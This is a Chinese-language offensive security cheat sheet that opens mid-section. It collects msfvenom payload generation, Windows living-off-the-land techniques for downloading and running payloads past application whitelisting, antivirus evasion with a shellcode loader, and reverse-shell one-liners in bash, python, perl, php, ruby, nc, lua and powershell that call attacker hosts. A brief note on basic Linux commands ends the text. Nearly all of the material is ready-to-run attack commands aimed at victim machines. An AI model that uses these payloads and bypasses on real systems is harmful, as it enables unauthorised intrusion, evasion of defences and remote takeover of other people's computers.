lua:
```bash 
msfvenom -p cmd/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o
payload.lua
```
windows shellcode:
```bash 
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=
攻击机IP LPORT=攻击机端口 -f c
```
linux shellcode:
```bash 
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻
击机IP LPORT=攻击机端口 -f c
```



# payload下载&白名单bypass



参考：

https://xz.aliyun.com/t/5768 渗透测试中弹shell的多种方式及bypass

https://micro8.gitbook.io/micro8/ 大佬经验十年总结



## python文件服务器

```
python2 -m SimpleHTTPServer 8081

python3 -m http.server 8081
```





**如果是单纯的下载payload推荐使用powershell或certutil进行下载，但是记得清理缓存**

## ftp

**下载姿势**

```bash
echo open 192.168.1.1 21> ftp.txt
echo ftp>> ftp.txt
echo bin >> ftp.txt
echo ftp>> ftp.txt
echo GET 1.exe >> ftp.txt
ftp -s:ftp.txt
```

需要搭建ftp服务器，用ftp下载防火墙会弹框拦截，使用前记得要先添加防火墙规则

**msf攻击**

msf启用监听

```
use exploit/multi/handler 
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
msf exploit(multi/handler) > set lhost 192.168.43.231
msf exploit(multi/handler) > set AutoRunScript migrate -f
msf exploit(multi/handler) > set lport 53
msf exploit(multi/handler) > exploit
```

![windows下基于白名单获取shell的方法整理（下）](img/bdf2a4380b78457aa0a59504fe516d04)

生成payload

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse\_tcp LHOST= 192.168.43.231 LPORT=53 -e x86/shikata\_ga_nai -b '\\\x00\\\x0a\\\xff' -i 3 -f exe -o payload.exe
```

![windows下基于白名单获取shell的方法整理（下）](img/84c115a3f22e43e49cc9b108e7dee7be)

靶机执行(payload传到靶机上)

```
echo !C:\\payload.exe > o &&echo quit >> o &Ftp ‐n ‐s:o &&del /F /Q o
```

![windows下基于白名单获取shell的方法整理（下）](img/042bd6f0a9954246a3fdc9b6ee52003a)



## ODBCCONF利用dll

ODBCCONF.exe是一个命令行工具，允许配置ODBC驱动程序和数据

说明：Odbcconf.exe所在路径已被系统添加PATH环境变量中，因此，Odbcconf命令可识

别，需注意x86，x64位的Odbcconf调用。

Windows 2003 默认位置：

C:\WINDOWS\system32\odbcconf.exe

C:\WINDOWS\SysWOW64\odbcconf.exe

Windows 7 默认位置：

C:\Windows\System32\odbcconf.exe

C:\Windows\SysWOW64\odbcconf.exe

msf启用监听

```
use exploit/multi/handler 
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
msf exploit(multi/handler) > set lhost 192.168.43.231
msf exploit(multi/handler) >  set AutoRunScript migrate -f
msf exploit(multi/handler) > set lport 53
msf exploit(multi/handler) > exploit
```

生成dll

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST= 92.168.43.231 LPORT=53  -f dll -o payload.dll
```

![windows下基于白名单获取shell的方法整理（下）](img/bdb5e9edd33d46a6a836ddd745b74eb1)

靶机执行以下代码（注意payload版本）

```
odbcconf.exe /a {regsvr C:\\payload.dll}
```

![windows下基于白名单获取shell的方法整理（下）](img/642120c5e5a247c2ae577528163ba5b7)

## cmstp利用dll

Cmstp安装或删除“连接管理器”服务配置文件。如果不含可选参数的情况下使用，则

cmstp 会使用对应于操作系统和用户的权限的默认设置来安装服务配置文件。

说明：Cmstp.exe所在路径已被系统添加PATH环境变量中，因此，Cmstp命令可识别，需

注意x86，x64位的Cmstp调用。

Windows 2003 默认位置：

C:\Windows\System32\cmstp.exe

C:\Windows\SysWOW64\cmstp.exe

Windows 7 默认位置：

C:\Windows\System32\cmstp.exe

C:\Windows\SysWOW64\cmstp.exe

msf启用监听

```
use exploit/multi/handler 
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
msf exploit(multi/handler) > set lhost 192.168.43.231
msf exploit(multi/handler) >  set AutoRunScript migrate -f
msf exploit(multi/handler) > set lport 53
msf exploit(multi/handler) > exploit
```

准备inf文件，以下是模板

```
[version]
 Signature=$chicago$
 AdvancedINF=2.5
[DefaultInstall_SingleUser]
 RegisterOCXs=RegisterOCXSection
[RegisterOCXSection]
 C:\payload.dll
[Strings]
 AppAct = "SOFTWARE\Microsoft\Connection Manager" 
 ServiceName="safe6" 
 ShortSvcName="safe6"
```

INF 文件的 RegisterOCXSection 需要包含恶意 DLL 文件的本地路径或远程执行的 WebDAV 位置

然后再靶机执行以下命令

```
cmstp /s safe6.inf
```

![windows下基于白名单获取shell的方法整理（下）](img/3085efce68554bb1a68a554107a74231)



## Rundll

Rundll32.exe与Windows操作系统相关联，Rundll32.exe可调用从DLL导出的函数（16位或32位）并将其存储在特定的内存库中。

通过SMB交付Metasploit发起Rundll32攻击

Metasploit包含“ SMB Delivery”模块，该模块生成恶意的dll文件。 该模块通过SMB服务器提供有效负载，并提供控制命令。 当前支持DLL和Powershell。

```
use exploit/windows/smb/smb_delivery
msf exploit(windows/smb/smb_delivery) > set srvhost 192.168.1.109
msf exploit(windows/smb/smb_delivery) > exploit
```

下面通过Rundll32.exe命令获得meterpreter会话。

![windows下基于白名单获取shell的方法整理（上）](img/c125051f16bc49c29da567e9dc6cf96d)

在受控机器上远程执行恶意dll,你将获得受控计算机的反向shell。

```
rundll32.exe \\\192.168.1.109\\vabFG\\test.dll,0
```

![windows下基于白名单获取shell的方法整理（上）](img/a1e6033798d64d1c9e098e5e4416d5b8)

获得meterpreter会话如下：

![windows下基于白名单获取shell的方法整理（上）](img/63e9268f2dbf4a9c867b7682a1a21054)



## Regsvr32

Regsvr32.exe是一个命令行程序，用于注册和注销OLE控件，例如Windows注册表中的DLL和ActiveX控件。Regsvr32.exe安装在Windows XP和Windows更高版本的％systemroot％\ System32文件夹下。

```
RegSvr32.exe具有以下命令行选项：
语法：Regsvr32 [/s] [/ u] \[/ n] \[/ i [：cmdline\]\]<dllname>            
 / u –注销服务器            
 / i –调用DllInstall，并为其传递可选的\[cmdline\]；     与/ u一起使用时，它将调用dll进行卸载         
/ n –不调用DllRegisterServer；此选项必须与
/ i一起使用
/ s –静音；不显示消息框
```

通过Metasploit的脚本Web交付启动Regsvr32

此模块可快速启动提供有效负载的Web服务器。提供的命令将允许有效负载下载并执行。它将通过regsvr32.exe来指定脚本语言解释器或“ squibledoo”来绕过应用程序白名单。该模块的主要目的是在目标计算机上快速建立会话。

Regsvr32使用squiblydoo技术绕过应用程序白名单。签名的Microsoft二进制文件Regsvr32能够运行.sct文件，然后在其中执行包含PowerShell命令。两个Web请求（即.sct文件和PowerShell下载/执行）都可以在同一端口上执行。“PSH（Binary）”会将文件写入到硬盘中，允许自定义二进制文件被下载和执行。

```
use exploit/multi/script/web_delivery
msf exploit (web_delivery)>set target 3
msf exploit (web_delivery)> set payloadphp/meterpreter/reverse\_tcp
msf exploit (web_delivery)> set lhost192.168.1.109
msf exploit (web_delivery)>set srvhost192.168.1.109
msf exploit (web_delivery)>exploit
```

复制下图中突出被框选的代码：

![windows下基于白名单获取shell的方法整理（上）](img/35a542b7767642698a91f0b507344fef)

一旦该exploit被执行，您将拥有一个为您创建的URL。在受害者pc的命令提示符中运行该URL，如下所示：

![windows下基于白名单获取shell的方法整理（上）](img/3680facddad648698153a8741e3ec61a)

在命令执行后按Enter键，您将拥有您的会话。如下图所示，输入sysinfo命令获取主机信息：

![windows下基于白名单获取shell的方法整理（上）](img/9cc5141d0bdf45faab6a059adfcde5b0)





## vbs

vbs downloader,使用msxml2.xmlhttp和adodb.stream对象



```vbscript
Set Post = CreateObject("Msxml2.XMLHTTP")
Set Shell = CreateObject("Wscript.Shell")
Post.Open "GET","http://192.168.1.1/1.exe",0
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
aGet.Write(Post.responseBody)
aGet.SaveToFile "C:\test\1.exe",2
```



## powershell

**下载**

```powershell
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','C:\test\1.exe');start-process 'C:\test\1.exe'
```

```
(New-Object Net.WebClient).DownloadString("http://xx.xx.xx.xx /test.ps1")
```

**下载执行**

```
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://xxx.xx.xx.xx/test.ps1")
```



**Powercat攻击**

PowerCat是一个的powershell写的TCP / IP瑞士军刀，看一看成NCAT的的powershell的实现，然后里面也加入了众多好用的功能，如文件上传，SMB协议支持，中继模式，生成有效载荷，端口扫描等等。

```
git clone https://github.com/besimorhino/powercat.git
cd powercat
python -m SimpleHTTPServer 80
```

![windows下基于白名单获取shell的方法整理（上）](img/c0da3e7d583f4b61a00d75a2072a9294)

然后在远程端执行下面的命令获得netcat会话。

```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
```

![windows下基于白名单获取shell的方法整理（上）](img/2346fb6ca38d4898a81b1920e37ced11)

正如你观察到的，我们已经获得了目标机器的netcat会话。

![windows下基于白名单获取shell的方法整理（上）](img/1b17381a87d049dfa1316a123a0f702e)



**批处理文件攻击(powerShell脚本)**

同样，PowerShell 允许客户端执行批处理文件，因此让我们使用 msfvenom 生成恶意批处理文件，如下所示，然后启动 netcat 侦听器。

```
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat
```

![windows下基于白名单获取shell的方法整理（上）](img/020d23c3d0324d088d30821178f4e640)

然后执行以下命令以获取 netcat 会话。

```
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
```

![windows下基于白名单获取shell的方法整理（上）](img/d1c671b0e70443678e5403d6ed722cbe)

如下，我们已经获得了目标机器的netcat会话。

![windows下基于白名单获取shell的方法整理（上）](img/ca544b7a5a5d4d66b1929fac914070a4)

**利用cscript.exe攻击**

同样，PowerShell 允许客户端执行cscript.exe 运行 wsf、js 和vbscript文件。因此，让我们生成具有 msfvenom 的恶意bat文件，如下所示，并作为侦听器启动multi/handler程序。

```
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs >1.vbs
```

![windows下基于白名单获取shell的方法整理（上）](img/f4f61e9a66774ed49a489cf3bf851d48)

在目标机器上执行下面的命令行获得meterpreter会话。

```
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\\"$env:temp\\test.vbs\\");Start-Process %windir%\\system32\\cscript.exe \\"$env:temp\\test.vbs\\""
```

![windows下基于白名单获取shell的方法整理（上）](img/9e4a9da381c94e66b406bacda546729d)

```
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.109
msf exploit(multi/handler) > set lport 1234
msf exploit(multi/handler) > exploit
```

获得meterpreter会话如下：

![windows下基于白名单获取shell的方法整理（上）](img/1c36d896178b4ff49c690fa0bfdb43f1)



## certutil渗透常用

Certutil.exe是作为证书服务的一部分安装的命令行程序。

**下载姿势**

保存在当前路径，文件名称同URL

```bash
certutil.exe -urlcache -split -f http://192.168.1.1/1.exe
```

保存在当前路径，指定保存文件名称

```bash
certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.php
```

隐藏在ADS数据流中:

```
certutil.exe -urlcache -split -f https://xx.xx.xx.xx/xx c:\\temp:ttt
```

使用downloader默认在缓存目录位置： `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`保存下载的文件副本

命令行删除缓存

```bash
certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete
```

查看缓存项目：

```
certutil.exe -urlcache *
```

转为base64

```
certutil -encode lcx64.exe lcx64.txt
```

转回来

```
certutil -decode lcx64.txt lcx64.exe
```

查看md5

```
certutil -hashfile a.exe MD5
```



**姿势学习**

https://y4er.com/post/certutil-powershell-write-file/ 极限环境Certutil加Powershell配合Burp快速落地文件







**msf攻击**

通过msfvenom 生成恶意可执行文件，并使用start multi/handler 获取目标计算机反向shell会话。

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe
```

再用python生成一个简易的http服务器

![windows下基于白名单获取shell的方法整理（上）](img/be5df3d4110c40e0bd188984c168ff21)

现在，为了使用certutil.exe能够获取配置信息和可执行文件,我们需要使用如下语法：

语法:[-f] [-urlcache] [-split]可执行文件路径

```
certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
```

![windows下基于白名单获取shell的方法整理（上）](img/bd28c7d78d564527856de8a733a2d034)

```
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.109
msf exploit(multi/handler) > set lport 1234
msf exploit(multi/handler) > exploit
```

这样，我们获得了目标计算机的反向shell。如下所示：

![windows下基于白名单获取shell的方法整理（上）](img/681a4b15639b4cdeb1195c4dd1ba529b)



## csc

csc.exe是微软.NET Framework 中的C#编译器，Windows系统中默认包含，可在命令行下将cs文件编译成exe

download.cs

```c#
using System.Net;
namespace downloader
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient client = new WebClient();
            string URLAddress = @"http://192.168.1.1/1.exe";
            string receivePath = @"C:\test\";
            client.DownloadFile(URLAddress, receivePath + System.IO.Path.GetFileName
        (URLAddress));
        }
    }
}
```

```bash
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:C:\tes
t\download.exe C:\test\download.cs
```



## Desktopimgdownldr

参考:https://www.anquanke.com/post/id/223232#h2-3 新型下载LOLBIN



用于设置锁定屏幕或桌面背景图像作为个性化CSP一部分.CSP在WIN10 1703之后引入



用户如果没有用过CSP，那么路径不存在。

```
C:\Windows\Personalization
```

默认图片下载和存放路径：

```
C:\windows\Personalization\LockScreenImage\LockScreenImage_%random%.jpg
```

Desktopimgdownldr默认用法：

```
desktopimgdownldr /lockscreenurl:https://domain.com:8080/file.exe /
eventName：randomname
```

用法

管理员运行，该文件会设置并覆盖用户锁定的屏幕图像，并生成注册表，我们需要将其注册表删除，避免将其屏幕覆盖

```cmd
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe
/lockscreenurl: https://xx.xx.xx.xx/xxx.ps1 && reg delete
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP
/f
```

注册表路径：

```
\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP
```

由于二进制文件desktopimgdownldr中的FunctionSHExpandEnvironmentStringsW使用硬编码地址，所以非管理员也能使用，而且无需注册表。

```
%systemroot%\Personalization\LockScreenImage
```

普通用户运行：

```
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe
/lockscreenurl: https://xx.xx.xx.xx/xxx.ps1 /eventName:desktopimgdownldr
```

管理员执行成功了。同时生成了注册表。

```
C:\Windows\system32>desktopimgdownldr
/lockscreenurl:http://xx.xxx.xx.xx/test.ps1 /eventName:randomname
```

[![img](img/t01aec2b6bc79f41db9.png)](https://p0.ssl.qhimg.com/t01aec2b6bc79f41db9.png)

[![img](img/t01c3e6c9239eb8cbf8.png)](https://p3.ssl.qhimg.com/t01c3e6c9239eb8cbf8.png)

我的机器环境使用了COM +注册目录。因为修改了%systemroot%目录导致文件找不到它。

```
mklink /J "%TEMP%\Registration" C:\windows\Registration && set
"SYSTEMROOT=%TEMP%" && cmd /c desktopimgdownldr.exe
/lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr &
rmdir /s /q "%TEMP%\Registration"
```

重新建立软连接后可以在普通用户下成功运行。

[![img](img/t01b708845cf66cd01d.png)](https://p4.ssl.qhimg.com/t01b708845cf66cd01d.png)



## CertReq

ertreq命令可用于从证书颁发机构（CA）请求证书，从CA检索对先前请求的响应，从.inf文件创建新请求，接受并安装对请求的响应，根据现有的CA证书或请求构造交叉认证或合格的从属请求，并签署交叉认证或合格的从属请求。  原本用于帮助windows进行证书认证。还能够作为上传，下载的重要工具。

用法

上传请求：

```
CertReq -Post -config https://example.org/ c:\windows\win.ini
```

下载POST请求，并显示内容（支持HTTP与HTTPS）：

```
CertReq -Post -config https://example.org/ c:\windows\win.ini
```

下载POST请求，并保存到本地（支持HTTP与HTTPS）：

```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```

Debug

个人测试的时候小文件是可以直接下载，估计50多kb左右，大文件会报错。

小文件：

[![img](img/t0179f4650d065eae52.png)](https://p5.ssl.qhimg.com/t0179f4650d065eae52.png)

大文件：

[![img](img/t01b1b14df688454ae5.png)](https://p3.ssl.qhimg.com/t01b1b14df688454ae5.png)



## Unix-GTFOBins

windows有LOLbins，Unix下当然也有。

### **whois**

whois用法

攻击机器监听

```
nc -l -p 12345 < "file_to_send"
```

靶机

```
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT > "$LFILE"
```

[![img](img/t0112d44980cbec3f22.png)](https://p2.ssl.qhimg.com/t0112d44980cbec3f22.png)

同理也能传递二进制文件，进行base64位编码。

```
base64 "file_to_send" | nc -l -p 12345
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT | base64 -d > "$LFILE"
```

### PIP

PIP用法

利用php install来下载文件。

```
export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])' > $TF/setup.py
pip install $TF
```

[![img](img/t011eb86eb5f0821b1c.png)](https://p4.ssl.qhimg.com/t011eb86eb5f0821b1c.png)

[![img](img/t0130f58e0dd124e805.png)](https://p0.ssl.qhimg.com/t0130f58e0dd124e805.png)



## Msiexec

Windows 操作系统附带了一个 Windows 安装程序引擎，该引擎由 MSI 程序包用于应用程序的安装。解释包和安装产品的可执行程序就是 Msiexec.exe。

通过msfvenom发起msiexec攻击

让我们利用MeterpreterWindows攻击载荷生成 MSI 包文件（1.msi）如下所示，并作为侦听器启动multi/handler程序进行监听。

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109lport=1234 -f msi > 1.msi
```

![windows下基于白名单获取shell的方法整理（上）](img/72bc56bfebf64e4ba172e338aa3ed553)

在msiexec 的帮助下，一旦您在远程计算机上执行 1.msi 文件，你会得到反向连接在您的本地计算机（Kali Linux）.

```
msiexec /q /i http://192.168.1.109/1.msi
```

![windows下基于白名单获取shell的方法整理（上）](img/f2796f1fb34749669bf9226c50adb17f)

```
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.109
msf exploit(multi/handler) > set lport 1234
msf exploit(multi/handler) > exploit
```

获得meterpreter会话如下：

![windows下基于白名单获取shell的方法整理（上）](img/5e9ff6a3206a451ea89e71974f72f1d2)





## MSBuild

意思就是msbuild可以编译执行csharp代码。

在这里我们需要知道的是msbuild的路径

加载32位的shellcode需要用32位的msbuild

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
```

加载64位的shellcode需要用64位的msbuild

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
```

我们这里用64位的shellcode和64位的win7来操作。

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -f csharp
```

生成shellcode之后我们需要用到一个三好学生师傅的https://github.com/3gstudent/msbuild-inline-task

我们用的是`executes x64 shellcode.xml`的模板，把里面45行之后的改为自己的shellcode

然后msf监听

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.1.130
set LPORT 4444
set ExitOnSession false
set autorunscript migrate -n explorer.exe
exploit -j
```

在目标机器上运行

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319>MSBuild.exe "C:\Users\jack.0DAY\Desktop\exec.xml"
```

然后会话上线，某数字卫士无反应，并且正常执行命令

[![img](img/20190722175301-7de41cd8-ac66-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190722175301-7de41cd8-ac66-1.png)

更多关于msbuild的内容可以参考[三好学生师傅的文章](https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/)







## Wmic

WMIC .exe是一个 Microsoft 工具，它提供了一个 WMI命令行界面，用于本地和远程计算机的各种管理功能，还用于在本地或远程执行系统设置、停止进程和执行脚本等查询。因此，它可以调用 XSL 脚本（可增强样式表语言）。

通过Koadic发起Wmic.exe攻击

koadic是一个命令控制（C2）工具，类似Metasploit和Powershell Empire。使用koadic我们生成恶意XSL文件。koadic安装完成后，您可以运行./koadic 文件以启动 koadic，然后通过运行以下命令开始加载stager/js/wmic 程序，并将 SRVHOST 设置为程序回连IP。

```
use stager/js/wmic
set SRVHOST 192.168.1.107
run
```

![windows下基于白名单获取shell的方法整理（上）](img/ea51968f293941acb8776c2e1e638c89)

执行 WMIC 以下命令，从远程服务器下载和运行恶意 XSL 文件：

```
wmic os get /FORMAT:"http://192.168.1.107:9996/g8gkv.xsl"
```

![windows下基于白名单获取shell的方法整理（上）](img/741d9a8fc6714d9c9b8be1bb33d77b8d)

一旦恶意的XSL文件在目标计算机上执行，你将有一个僵尸连接，就像Metasploit回连的情况一样。

![windows下基于白名单获取shell的方法整理（上）](img/10a0fd7fff40479888ff8c0c4828d3c1)



模板

```xml
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
    ]]> </ms:script>
</stylesheet>
```



参考:[利用wmic调用xsl文件的分析与利用](https://3gstudent.github.io/利用wmic调用xsl文件的分析与利用/)
这里还有一个poc https://raw.githubusercontent.com/kmkz/Sources/master/wmic-poc.xsl



**绑定程序运行**

当test.exe运行时，cmd.exe也将运行

```
wmic.exe process call create "C:\\Windows\\system32\\reg.exe add

\\\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File

Execution

Options\\test.exe\\" /v \\"Debugger\\" /t REG_SZ /d \\"cmd.exe\\"/
f"
```



## hta

Mshta.exe运行微软HTML应用程序主机，微软HTML应用程序主机是Windows应用用程序，负责运行HTA（HTML应用程序）文件。我们通运行HTML文件执行JavaScript和VBScript脚本。Mshta.exe可以解释这种文件。

**下载姿势**

添加最小化和自动退出hta程序的功能，执行过程中会最小化hta窗口，下载文件结束后自动退出hta程序

将以下代码保存为hta文件

```html
<html>
<head>
<script>
var Object = new ActiveXObject("MSXML2.XMLHTTP");
Object.open("GET","http://192.168.1.1/1.exe",false);
Object.send();
if (Object.Status == 200)
{
    var Stream = new ActiveXObject("ADODB.Stream");
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.SaveToFile("C:\\test\\1.exe", 2);
    Stream.Close();
}
window.close();
</script>
<HTA:APPLICATION
WINDOWSTATE = "minimize">
</head>
<body>
</body>  
</html>
```

**利用msf攻击**

Metasploit 包含生成恶意HTA文件的“HTA WebServer”模块，恶意文件通过Powershell运行有效负载。当用户导航到HTA文件时，将在执行有效负载之前由IE两次提示它们。

用户导航到HTA文件时，将在执行有效负载之前由IE两次提示它们。

```
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) >set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) >set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) >exploit
```

现在可以在受害者机器上执行mshta.exe恶意代码获得meterpreter会话

![windows下基于白名单获取shell的方法整理（上）](img/8abbc72e7a0c4c629062ea6fc8e7ed31)

在受害者机器上通过mshta.exe访问恶意hta远程文件，你就可以在本机获得shell。

```
mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
```

![windows下基于白名单获取shell的方法整理（上）](img/5de872b6fc5843fcb8efc60420f09a23)

获得受害主机shell:

![windows下基于白名单获取shell的方法整理（上）](img/25479c224e12401097ef4646f52b14c1)







## bitsadmin

bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。xp以后的Windows系统自带

```bash
bitsadmin /transfer n http://192.168.1.1/1.exe  C:\test\update\1.exe
```

**不支持https、ftp协议，php python带的服务器会出错**





## Installutil

Installer工具是一个命令行实用程序，允许您通过执行指定程序集中的安装程序组件来

安装和卸载服务器资源。此工具与System.Configuration.Install命名空间中的类一起使用

说明：Installutil.exe所在路径没有被系统添加PATH环境变量中，因此，Installutil命令无法

识别。

**相关工具**

https://github.com/khr0x40sh/WhiteListEvasion



**msf攻击**

可以用来bypass

```
exploit/windows/local/applocker_bypass
```



### Installutil&csc配合使用

通过msfvenom生成C＃的shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -f csharp
```

下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中

https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260

csc编译InstallUtil-ShellCode.cs

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:D:\test\InstallUtil-shell.exe D:\test\InstallUtil-ShellCode.cs
```

编译生成的文件后缀名无所谓exe dll txt都可以，但只能InstallUtil.exe来触发

InstallUtil.exe执行 反弹shell

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U D:\test\InstallUtil-shell.exe
```

参考https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/



## regasm和regsvcs

regasm和regsvcs都可以用来反弹shell的，而且方式也一样

[下载这个cs文件](https://github.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution/blob/master/regsvcs.cs) ，然后替换你的shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -f csharp
```

使用sn.exe生成公钥和私钥，如果没有sn命令你可能需要安装vs

```
sn -k key.snk
```

编译dll，注意文件的路径

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:1.dll /keyfile:key.snk regsvcs.cs
```

用这两者上线

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe 1.dll 
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe 1.dll
```

或者这样

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U 1.dll 
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U 1.dll
```

上线成功。





# 免杀

## payload分离免杀

在这里也只介绍两种分离免杀的姿势

### shellcode loader

借助第三方加载器，将shellcode加载到内存中来执行。

https://github.com/clinicallyinane/shellcode_launcher

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -e x86/shikata_ga_nai -i 5 -f raw > test.c
```

靶机执行

```
shellcode_launcher.exe -i test.c
```

msf监听正常上线



# 反弹shell



## 监听

**nc**

```bash
nc -lvvp 4444
```


## bash

```bash
bash -i >& /dev/tcp/172.16.1.130/4444 0>&1
```

```bash
exec 5<>/dev/tcp/172.16.1.130/4444;cat <&5|while read line;do $line >&5 2>&1;done
```

## perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.41",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

## php

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## nc

```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
```

## java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## lua

```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

## powershell

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444
```









# linux命令笔记

## 基础常用命令

- `某个命令 --h`，对这个命令进行解释

- `某个命令 --help`，解释这个命令(更详细)

- `man某个命令`，文档式解释这个命令(更更详细)(执行该命令后,还可以按/+关键字进行查询结果的搜索)

- `Ctrl + c`，结束命令

- `TAB键`，自动补全命令（按一次自动补全，连续按两次，提示所有以输入开头字母的所有命令）

- `键盘上下键`，输入临近的历史命令

- `history`，查看所有的历史命令

- `Ctrl + r`，进入历史命令的搜索功能模式

- `clear`，清除屏幕里面的所有命令

- `pwd`，显示当前目录路径（常用）

